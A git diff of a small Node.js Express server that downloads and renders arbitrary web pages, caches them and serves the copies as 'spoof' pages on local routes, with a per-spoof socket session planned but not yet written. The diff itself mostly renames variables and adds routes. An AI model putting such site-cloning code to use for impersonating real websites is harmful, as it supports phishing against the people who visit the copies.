@@ -11,10 +11,11 @@ let spoofURL = "https://www.google.com"
 const log = console.log
 const PORT = 8888
 const app = exp()
+// tmp testing pages
 let downloaded_page = ''
 let rendered_page = ''
-
-const pages = {
+// production pages
+const page_cache = {
 
 }
 
@@ -71,12 +72,6 @@ initiate()
 
 
 
-
-
-
-
-
-
 // startup
 app.listen(PORT, (err) => {
     if (err) log(err)
@@ -86,31 +81,38 @@ app.listen(PORT, (err) => {
 // MIDDLEWARE
 app.use(bodyparser.urlencoded({extended: false}))
 app.use(bodyparser.json())
+app.use(exp.static('templates'))
 
 // ROUTING
+// home test
+app.get('/home', (req, res)=>{
+    res.sendFile(path.join(__dirname, "templates", "index.html"))
+})
 // spoof page
 app.get('/:spoof_url', (req, res)=>{
     // 404 on non existant spoof or invalid url
     if(!isURL(req.params.spoof_url)) return res.sendStatus(404)
-    if(!pages[req.params.spoof_url]) return res.sendStatus(404)
-    res.send(pages[req.params.spoof_url].rendered_page)
+    if(!page_cache[req.params.spoof_url]) return res.sendStatus(404)
+    res.send(page_cache[req.params.spoof_url].rendered_page)
 })
+
 // main page
 app.get('/', (req, res) => {
     res.send(rendered_page)
 })
 // initiate new spoof
-app.post('/spoof', async (req, res)=>{
-    let url_2_spoof = req.body.url
+app.post('/spoof', async (req, res)=>{ // takes in post form url field, and creates new spoof page from it, and responds with the url
+    let url_2_spoof = decodeURI(req.body.url)
+    log(`Spoof request for __ ${url_2_spoof} __`)
     let new_url = await create_spoof(url_2_spoof) // should return new path of spoofed page
     return res.redirect(`${new_url}`) // redirect to spoofed route /:spoof_url
 })
-async function create_spoof(url){
+async function create_spoof(url){ // creates spoof site and socket session, returns url for spoof
     let new_page = new Page()
     new_page.download_page = await download_page(url)
     new_page.rendered_page = await render_page(url)
     new_page.url = url
-    pages[url] = new_page // set into global pages object
+    page_cache[url] = new_page // set into global pages object
     // create socket session
 
 
